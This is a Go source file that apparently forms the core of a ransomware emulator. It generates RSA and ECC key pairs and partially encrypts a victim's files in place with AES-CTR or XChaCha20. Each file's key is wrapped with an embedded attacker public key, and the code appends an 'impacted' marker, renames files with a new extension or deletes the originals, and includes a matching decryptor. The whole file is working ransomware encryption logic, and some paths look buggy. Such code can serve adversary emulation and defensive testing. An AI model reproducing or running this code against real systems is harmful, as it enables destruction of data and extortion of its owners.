package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/elliptic"
	r "crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"github.com/Anonghost720/ecc"
	"golang.org/x/crypto/chacha20"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"sync"
)

var fileNameSkipRegex *regexp.Regexp

// impacted
var encryptionSignature = []byte{105, 109, 112, 97, 99, 116, 101, 100}

func setupKeyData(asymKeys AsymKeyHandler, decrypting bool, groupCipher string) (AsymKeyHandler, error) {
	var err error
	if decrypting {
		// Are we supplying an override cipher in arguments?
		if asymKeys.RSAPrivateKeyFile != "" {
			asymKeys.RSAPrivateKey, err = getPrivateRSAKeyFromFile(asymKeys.RSAPrivateKeyFile)
			if err != nil {
				return asymKeys, fmt.Errorf("Error getting RSA Private key from specified file: %s", err.Error())
			}
			asymKeys.System = "rsa"
		} else if asymKeys.ECCPrivateKeyFile != "" {
			asymKeys.ECCPrivateKey, err = getPrivateECCKeyFromFile(asymKeys.ECCPrivateKeyFile)
			if err != nil {
				return asymKeys, fmt.Errorf("Error getting ECC Private key from specified file: %s", err.Error())
			}
			asymKeys.System = "ecc"
		} else {
			// Should never hit this branch as we MUST supply a private key when decrypting
			return asymKeys, fmt.Errorf("No private key supplied for decryption!")
		}
	} else {
		// Encryption - same checks but in reverse
		if asymKeys.RSAPublicKeyFile != "" {
			asymKeys.RSAPublicKey, err = getPublicRSAKeyFromFile(asymKeys.RSAPublicKeyFile, false)
			if err != nil {
				return asymKeys, fmt.Errorf("Error getting RSA Public key from specified file: %s", err.Error())
			}
			asymKeys.System = "rsa"
		} else if asymKeys.ECCPublicKeyFile != "" {
			asymKeys.ECCPublicKey, err = getPublicECCKeyFromFile(asymKeys.ECCPublicKeyFile, false)
			if err != nil {
				return asymKeys, fmt.Errorf("Error getting ECC Public key from specified file: %s", err.Error())
			}
			asymKeys.System = "ecc"
		} else {
			// We will use the groups default cipher and our embedded public key
			asymKeys.System = groupCipher
			if asymKeys.System == "rsa" {
				asymKeys.RSAPublicKey, err = getPublicRSAKeyFromFile(rsaKeyName, true)
				if err != nil {
					return asymKeys, fmt.Errorf("Error getting RSA Public key from embedded file: %s", err.Error())
				}
			} else if asymKeys.System == "ecc" {
				asymKeys.ECCPublicKey, err = getPublicECCKeyFromFile(eccKeyName, true)
				if err != nil {
					return asymKeys, fmt.Errorf("Error getting ECC Public key from embedded file: %s", err.Error())
				}
			}
		}
	}
	return asymKeys, nil
}

func getPublicRSAKeyFromFile(file string, embedded bool) (*rsa.PublicKey, error) {
	pubKeyData := make([]byte, 0)
	var err error
	if embedded {
		pubKeyData, err = publicKeys.ReadFile(file)
		if err != nil {
			return nil, fmt.Errorf("Error reading embedded RSA Public Key: %s", err)
		}
	} else {
		pubKeyData, err = os.ReadFile(file)
		if err != nil {
			return nil, fmt.Errorf("Failed to read RSA Public Key file: %v", err)
		}
	}
	// Decode the PEM data
	block, _ := pem.Decode(pubKeyData)
	if block == nil || block.Type != "RSA PUBLIC KEY" {
		return nil, fmt.Errorf("Failed to decode PEM block containing public key")
	}

	// Parse the public key
	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("Failed to parse public key: %v", err)
	}
	return pub, nil
}

func getPrivateRSAKeyFromFile(file string) (*rsa.PrivateKey, error) {
	keyData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Failed to read private key file: %v", err)
	}
	// Decode the PEM data
	block, _ := pem.Decode(keyData)
	if block == nil || block.Type != "RSA PRIVATE KEY" {
		return nil, fmt.Errorf("Failed to decode PEM block containing private key")
	}
	// Parse the public key
	pri, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("Failed to parse private key: %v", err)
	}
	return pri, nil
}

func getPublicECCKeyFromFile(file string, embedded bool) (*ecc.Public, error) {
	pubKeyData := make([]byte, 0)
	var err error
	if embedded {
		pubKeyData, err = publicKeys.ReadFile(file)
		return nil, fmt.Errorf("Error reading embedded ECC Public Key: %s", err)
	} else {
		pubKeyData, err = os.ReadFile(file)
		if err != nil {
			return nil, fmt.Errorf("Failed to read ECC Public Key file: %v", err)
		}
	}
	publicKey, err := ecc.ParsePublicKey(elliptic.P521(), pubKeyData)
	if err != nil {
		return nil, err
	}
	return publicKey, nil
}

func getPrivateECCKeyFromFile(file string) (*ecc.Private, error) {
	keyData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Failed to read private ECC key file: %v", err)
	}
	pks := ecc.Private{
		D: nil,
		Public: &ecc.Public{
			Curve: elliptic.P521(),
			X:     nil,
			Y:     nil,
		},
	}
	err = json.Unmarshal(keyData, &pks)
	if err != nil {
		return nil, err
	}
	return &pks, nil
}

func generateRSA() (string, string) {

	filename := "rsa_key"
	bitSize := 4096

	rsakey, err := rsa.GenerateKey(r.Reader, bitSize)
	if err != nil {
		panic(err)
	}
	pub := rsakey.Public()

	// Encode private key to PKCS#1 ASN.1 PEM.
	keyPEM := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(rsakey),
		},
	)

	// Encode public key to PKCS#1 ASN.1 PEM.
	pubPEM := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PUBLIC KEY",
			Bytes: x509.MarshalPKCS1PublicKey(pub.(*rsa.PublicKey)),
		},
	)

	// Typically, this is the key attacker would retain control of to generate decryptor
	if err := os.WriteFile(filename+".rsa", keyPEM, 0700); err != nil {
		panic(err)
	}

	if err := os.WriteFile(filename+".rsa.pub", pubPEM, 0755); err != nil {
		panic(err)
	}
	return filename + ".rsa.pub", filename + ".rsa"
}

func generateECC() (string, string, error) {
	// Using https://github.com/Anonghost720/ecc/blob/master/LICENSE as a helper function implementing ECIES
	filename := "ecc_key"
	privateKeyStruct, err := ecc.GenerateKey(elliptic.P521())
	if err != nil {
		return "", "", err
	}
	/*	privateInt, err := privateKeyStruct.D.MarshalText()
		if err != nil {
			return "", "", err
		}*/

	/*	msg := []byte("TESTINGTESTING")
		c, err := k1.Public.Encrypt(msg)
		if err != nil {
			log.Fatalln(err)
		}
		m, err := k1.Decrypt(c, k1.Public.Curve)
		if err != nil {
			log.Fatalln(err)
		}*/

	f, err := os.Create(filename + ".ecc")
	if err != nil {
		return "", "", err
	}
	defer f.Close()
	jsonData, err := json.Marshal(privateKeyStruct)
	if err != nil {
		return "", "", err
	}
	f.Write(jsonData)

	if err = os.WriteFile(filename+".ecc.pub", privateKeyStruct.Public.Bytes(), 0755); err != nil {
		return "", "", err
	}
	return filename + ".ecc.pub", filename + ".ecc", nil
}

func generateKeys() (AsymKeyHandler, error) {
	var err error
	asymKeys := AsymKeyHandler{
		RSAPublicKey:      nil,
		RSAPublicKeyFile:  "",
		RSAPrivateKeyFile: "",
		ECCPrivateKeyFile: "",
		ECCPublicKeyFile:  "",
		RSAPrivateKey:     nil,
		ECCPublicKey:      nil,
		ECCPrivateKey:     nil,
		System:            "",
	}
	// TODO error handling
	asymKeys.RSAPublicKeyFile, asymKeys.RSAPrivateKeyFile = generateRSA()
	/*	asymKeys.RSAPublicKey, err = getPublicRSAKeyFromFile(publicRSAKeyFile)
		if err != nil {
			return asymKeys, err
		}
		asymKeys.RSAPrivateKey, err = getPrivateRSAKeyFromFile(privateRSAKeyFile)
		if err != nil {
			return asymKeys, err
		}*/
	asymKeys.ECCPublicKeyFile, asymKeys.ECCPrivateKeyFile, err = generateECC()
	if err != nil {
		return asymKeys, err
	}
	/*	asymKeys.ECCPublicKey, err = getPublicECCKeyFromFile(publicECCKeyFile)
		if err != nil {
			return asymKeys, err
		}
		asymKeys.ECCPrivateKey, err = getPrivateECCKeyFromFile(privateECCKeyFile)
		if err != nil {
			return asymKeys, err
		}*/
	/*	msg := []byte("TESTINGTESTING")
		c, err := asymKeys.ECCPublicKey.Encrypt(msg)
		if err != nil {
			log.Fatalln(err)
		}
		m, err := asymKeys.ECCPrivateKey.Decrypt(c, asymKeys.ECCPublicKey.Curve)
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Println(m)
		fmt.Println(string(m))*/

	return asymKeys, nil

}

func encryptionWorker(c chan File, ewg *sync.WaitGroup, noteName string, method string, cipher string, extension string, asymKeys AsymKeyHandler, decrypt bool, group RansomActor, config Config) {
	// Receives files to encrypt
	// If we are encrypting data, we need to use private key system to encrypt some 'extra' data appended
	// Reverse if we are decrypting
	// We need an interface to let the encrypter handle this seamlessly without caring about the implementation details
	// Each implementation should return either a byte-structure or a struct
	defer ewg.Done()
	for {
		file, ok := <-c
		if !ok {
			break
		} else {
			if filepath.Base(file.Path) == noteName {
				continue
			}
			if decrypt {
				decryptFile(file, cipher, asymKeys, group)
				continue
			} else {
				encryptFile(file, method, extension, group.ExtensionMethod, asymKeys, cipher, config.ThresholdFullEncrypt, config.EncryptionPercent)
				continue
			}
		}
	}
}

func shouldProcessFile(f string, config *Config) bool {
	// Extension is in our exclusion list
	if slices.Contains(config.FileExtensionExclusions, filepath.Ext(f)) {
		return false
	}
	extension := strings.ToLower(filepath.Ext(f))
	nameWithoutExt := strings.TrimSuffix(filepath.Base(f), extension)
	// Base file name matches exclusion list
	if fileNameSkipRegex.MatchString(nameWithoutExt) {
		return false
	}

	// Base Directory matches skip list
	baseDirectory := filepath.Base(filepath.Dir(f))
	if slices.Contains(config.DirectoryExclusions, baseDirectory) {
		return false
	}

	// Extension Inclusions
	if slices.Contains(config.FileExtensionInclusions, extension) {
		return true
	}

	// Fail Closed
	return false

}

func encryptFile(file File, method string, extension string, extensionMethod string, asymHandler AsymKeyHandler, cipher string, encryptThreshold int64, encryptPercentage int) {
	printFormattedMessage(fmt.Sprintf("Encrypting: "+file.Path), INFO)

	symHandler := SymHandler{
		System: cipher,
	}
	err := symHandler.Initialize(nil, nil)
	if err != nil {
		fmt.Println(err)
		return
	}

	inFile, err := os.Open(file.Path)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}
	defer inFile.Close()

	outFile, err := os.OpenFile(file.Path, os.O_RDWR, 0777)
	defer outFile.Close()
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}

	newPath := ""
	if extensionMethod == "append" {
		newPath = fmt.Sprintf("%s.%s", file.Path, extension)
	} else if extensionMethod == "mutate" {
		newBaseFile := strings.TrimSuffix(file.Path, filepath.Ext(file.Path))
		newPath = fmt.Sprintf("%s.%s", newBaseFile, extension)
	}

	if method == "outline" {
		outFile.Close()
		outFile, err = os.Create(newPath)
		defer outFile.Close()
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error opening file: %s", newPath), ERROR)
			return
		}
	}

	if file.Size <= encryptThreshold {
		ptb := make([]byte, file.Size)
		ct := make([]byte, file.Size)
		_, err = inFile.Read(ptb)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error encrypting file: %s", file.Path), ERROR)
			return
		}
		symHandler.Encrypt(ct, ptb)
		outFile.Write(ct)
		symHandler.EDS.PercentEncrypted = 100

	} else {
		symHandler.EDS.PercentEncrypted = int32(encryptPercentage)
		// So - for percentage, we want to basically check each 256 chunk of the file for percent and get as close to possible
		// Since we are doing 256 at a time, we want X% of 256 - our target bytes is X=(targetPercent/100)*256
		targetBytes := (symHandler.EDS.PercentEncrypted * 256 / 100)

		br := bufio.NewReaderSize(inFile, 256)
		// Encrypt 64, Leave 192, etc until last 256 bytes of file - then encrypt remainder
		for true {
			ptb := make([]byte, 256)
			n, err := br.Read(ptb)
			if err != nil && !errors.Is(err, io.EOF) {
				printFormattedMessage(fmt.Sprintf("Error reading file %s, %s", file.Path, err.Error()), ERROR)
				return
			}
			if n < 256 {
				// Encrypt remainder since EOF
				pt := make([]byte, n)
				ct := make([]byte, n)
				pt = ptb[:n] // Remove any non-read bytes from the buffer
				symHandler.Encrypt(ct, pt)
				outFile.Write(ct)
			} else {
				// should have read 256 bytes - we will encrypt just the 64 then write this back to the file along with remainder of 256 plain-text
				pt := make([]byte, targetBytes)
				ct := make([]byte, targetBytes)
				pt = ptb[:targetBytes]
				symHandler.Encrypt(ct, pt)
				outFile.Write(ct)
				outFile.Write(ptb[targetBytes:])
			}
			if err != nil && errors.Is(err, io.EOF) {
				break
			}
		}
	}

	// Store original file extension into the EDS
	originalExtension := filepath.Ext(file.Path)
	if originalExtension == "" {
		symHandler.EDS.OriginalExtension = ""
		symHandler.EDS.OriginalExtensionLength = 0
	} else {
		symHandler.EDS.OriginalExtension = originalExtension
		symHandler.EDS.OriginalExtensionLength = int32(len(originalExtension)) // TODO - Massive extensions would err
	}

	cipherEmbeddedData, err := asymHandler.Encrypt(symHandler.EDS)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error encrypting symmetric key data: %s", err.Error()), ERROR)
		return
	}

	// we will also write a uint64 representing the size of our newly encrypted EDS
	embeddedSizeByte := make([]byte, 8)
	binary.LittleEndian.PutUint64(embeddedSizeByte, uint64(int64(len(cipherEmbeddedData))))

	outFile.Write(cipherEmbeddedData)
	outFile.Write(embeddedSizeByte)
	outFile.Write(encryptionSignature)

	// We also need to 'mark' a file as encrypted somehow
	// For that, we will use a signature byte at the end of the file that should be unique

	inFile.Close()
	outFile.Close()

	// Now when we decrypt, first we start last 8 bytes then decrypt our EDS store for additional handling

	// Extension
	// Most of the time we can use a static one
	// We could also mutate the current extension with an embedded key or similar
	if method == "inline" {
		err = os.Rename(file.Path, newPath)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error renaming encrypted file: %s", err.Error()), ERROR)
		}
	}

	if method == "outline" {
		// Delete original file
		os.Remove(file.Path)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error deleting original file: %s", err.Error()), ERROR)
		}
	}
}

func decryptFile(file File, cipher string, asymKeys AsymKeyHandler, group RansomActor) {
	// First we need to check if the last 512 bytes of the file actually contains a key for us to decrypt using private key depending on cipher of choice
	// For XChaCha20, we should be able to read last 512 bits and convert split it into 32->24 byte array where 32=key and 24=nonce and generate a new unauthenticated cipher for use in decrypting rest of file
	// We skip the last 512 bits
	// DECRYPTION PROCESS
	// First, we read appropriate bytes from end of file backwards to get the ciphertext aes key
	// Then we decrypt using the privateKey
	// Then we decrypt file using plain-text symmetric key up to the byte where our key started and truncate from file
	printFormattedMessage(fmt.Sprintf("Decrypting: "+file.Path), INFO)
	inFile, err := os.Open(file.Path)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}
	defer inFile.Close()

	outFile, err := os.OpenFile(file.Path, os.O_RDWR, 0777)
	defer outFile.Close()
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Error opening file: %s", file.Path), ERROR)
		return
	}

	// First we read last 8 bytes to determine the length of our embedded EDS (if it exists)
	// This should be a uint64 value
	b := make([]byte, 8)
	offset := file.Size - 8
	if offset <= 0 {
		// file not encrypted, otherwise it would have a minimum size greater than 0 due to our appended key
		return
	}
	inFile.ReadAt(b, offset)
	// Now if a file is encrypted, b should be equal to our encryption signature
	for i, v := range b {
		if v != encryptionSignature[i] {
			return
		}
	}

	// Now we should be safe to assume that the relevant file is encrypted by our scheme and can proceed
	b = make([]byte, 8)
	edsLengthOffset := file.Size - 16
	if edsLengthOffset <= 0 {
		// file not encrypted, otherwise it would have a minimum size greater than 0 due to our appended key
		return
	}
	inFile.ReadAt(b, edsLengthOffset)

	edsLength := int64(binary.LittleEndian.Uint64(b))

	// Now we need to read our eds ciphertext - subtract offsets for known length, 8-bytes storing length and 8-bytes storing encryption signature
	edsB := make([]byte, edsLength)
	edsOffset := file.Size - 16 - edsLength
	if edsOffset <= 0 {
		fmt.Println("EDS Offset Error")
		return
	}

	inFile.ReadAt(edsB, edsOffset)
	// Now we should have the ciphertext representing the EDS - need to decrypt

	eds, err := asymKeys.Decrypt(edsB)
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	symHandler := SymHandler{
		System: cipher,
	}
	err = symHandler.Initialize(eds.SymmetricKey, eds.SymmetricNonce)
	if err != nil {
		fmt.Println(err)
		return
	}

	// At this point, we should have the fully decrypted EDS containing symmetric keys and nonces
	// Now it is just a matter of using it to decrypt data depending on the system

	/*	sym_key := decryptEmbeddedData[0:32]
		nonce := decryptEmbeddedData[32:]*/
	//c, _ := getXChaCha20Cipher(eds.SymmetricKey, eds.SymmetricNonce)
	fileOffSetRemoval := edsLength + 16 // The length of our eds Cipher Text plus the last 16 bytes representing the length storage and sig
	// We need to decrypt up to file.Size-512 bytes since after that is our key
	// One approach would be immediately truncating the file to prevent
	// another is just looping through until we reach specified offset

	ep := eds.PercentEncrypted
	targetBytes := ep * 256 / 100
	offset = int64(0)
	offsetTarget := file.Size - fileOffSetRemoval // How do we prevent overflowing into this?
	// Each iteration we calculate (file.Size-512) which is the EOF range with offsetTarget
	// Once we reach a point where reading targetBytes will take us over, we trim our buffer to that and decrypt remainder and stop
	// As we read, we increase offset by 256
	lastBytesRead := int64(0)
	for true {
		final := false
		bytesToRead := int64(256)
		offset += lastBytesRead
		if offset+int64(256) >= offsetTarget {
			// If our next read will take us into key territory, adjust bytes read instead of 256 to the difference remaining and decrypt the remainder
			bytesToRead = offsetTarget - offset
			final = true
		}
		ctn := make([]byte, bytesToRead)
		bytesRead, err := inFile.ReadAt(ctn, offset)
		if err != nil {
			return
		}

		if bytesRead < 256 {
			// Decrypt remainder since EOF
			pt := make([]byte, bytesRead)
			ct := make([]byte, bytesRead)
			pt = ctn[:bytesRead] // Remove any non-read bytes from the buffer
			symHandler.Encrypt(pt, ct)
			outFile.Write(ct)
		} else {
			// should have read 256 bytes - we will decrypt just the 64 then write this back to the file along with remainder of 256 plain-text
			pt := make([]byte, targetBytes)
			ct := make([]byte, targetBytes)
			ct = ctn[:targetBytes]
			symHandler.Encrypt(pt, ct)
			outFile.Write(pt)
			outFile.Write(ctn[targetBytes:])
		}

		lastBytesRead = int64(bytesRead)
		if final {
			// EOF
			break
		}

	}

	// Remove our encrypted signature from the end
	outFile.Truncate(file.Size - fileOffSetRemoval)
	inFile.Close()
	outFile.Close()

	if group.ExtensionMethod == "append" {
		// Need to trim final extension
		newFileName := removeLastExtension(filepath.Base(file.Path))
		fileDir := filepath.Dir(file.Path)
		newPath := filepath.Join(fileDir, newFileName)
		err = os.Rename(file.Path, newPath)
		if err != nil {
			fmt.Println(err.Error())
		}
	} else if group.ExtensionMethod == "mutate" {
		newFileName := removeLastExtension(filepath.Base(file.Path))
		// We also want to re-add original extension
		newFileName = fmt.Sprintf("%s%s", newFileName, eds.OriginalExtension)
		fileDir := filepath.Dir(file.Path)
		newPath := filepath.Join(fileDir, newFileName)
		err = os.Rename(file.Path, newPath)
		if err != nil {
			fmt.Println(err.Error())
		}
	}

}

func getXChaCha20Cipher(sym_key []byte, nonce []byte) (*chacha20.Cipher, ExtraDataStore) {
	if sym_key == nil {
		sym_key = make([]byte, 32)
		if _, err := io.ReadFull(r.Reader, sym_key); err != nil {
			panic(err)
		}
	}
	if nonce == nil {
		// 192-bit nonce (24 bytes) for XChaCha20
		nonce = make([]byte, 24)
		if _, err := io.ReadFull(r.Reader, nonce); err != nil {
			panic(err)
		}
	}
	c, err := chacha20.NewUnauthenticatedCipher(sym_key, nonce)
	if err != nil {
		panic(err)
	}
	/*	emeddedData := make([]byte, 0)
		emeddedData = append(emeddedData, sym_key...)
		emeddedData = append(emeddedData, nonce...)*/

	eds := ExtraDataStore{
		LengthSymmetricKey:   int64(len(sym_key)),
		SymmetricKey:         sym_key,
		LengthSymmetricNonce: int64(len(nonce)),
		SymmetricNonce:       nonce,
		PercentEncrypted:     0,
	}

	return c, eds
}

func getAES256Cipher(sym_key []byte, nonce []byte) (cipher.Stream, ExtraDataStore) {
	if sym_key == nil {
		sym_key = make([]byte, 32)
		if _, err := io.ReadFull(r.Reader, sym_key); err != nil {
			panic(err)
		}
	}
	if nonce == nil {
		nonce = make([]byte, 16)
		if _, err := io.ReadFull(r.Reader, nonce); err != nil {
			panic(err)
		}
	}

	block, err := aes.NewCipher(sym_key)
	if err != nil {
		panic(err.Error())
	}
	aesCTR := cipher.NewCTR(block, nonce)
	/*	emeddedData := make([]byte, 0)
		emeddedData = append(emeddedData, sym_key...)
		emeddedData = append(emeddedData, nonce...)*/

	eds := ExtraDataStore{
		LengthSymmetricKey:   int64(len(sym_key)),
		SymmetricKey:         sym_key,
		LengthSymmetricNonce: int64(len(nonce)),
		SymmetricNonce:       nonce,
		PercentEncrypted:     0,
	}
	return aesCTR, eds
}

// RSA Encryption/Decryption
// https://stackoverflow.com/questions/62348923/rs256-message-too-long-for-rsa-public-key-size-error-signing-jwt?answertab=votes#tab-top
func EncryptRSA(public *rsa.PublicKey, msg []byte, label []byte) ([]byte, error) {
	hash := sha1.New()
	random := r.Reader
	msgLen := len(msg)
	step := public.Size() - 2*hash.Size() - 2
	var encryptedBytes []byte

	for start := 0; start < msgLen; start += step {
		finish := start + step
		if finish > msgLen {
			finish = msgLen
		}

		encryptedBlockBytes, err := rsa.EncryptOAEP(hash, random, public, msg[start:finish], label)
		if err != nil {
			return nil, err
		}

		encryptedBytes = append(encryptedBytes, encryptedBlockBytes...)
	}

	return encryptedBytes, nil
}

// https://stackoverflow.com/questions/62348923/rs256-message-too-long-for-rsa-public-key-size-error-signing-jwt?answertab=votes#tab-top
func DecryptRSA(private *rsa.PrivateKey, msg []byte, label []byte) ([]byte, error) {
	hash := sha1.New()
	random := r.Reader
	msgLen := len(msg)
	step := private.PublicKey.Size()
	var decryptedBytes []byte

	for start := 0; start < msgLen; start += step {
		finish := start + step
		if finish > msgLen {
			finish = msgLen
		}

		decryptedBlockBytes, err := rsa.DecryptOAEP(hash, random, private, msg[start:finish], label)
		if err != nil {
			return nil, err
		}

		decryptedBytes = append(decryptedBytes, decryptedBlockBytes...)
	}

	return decryptedBytes, nil
}
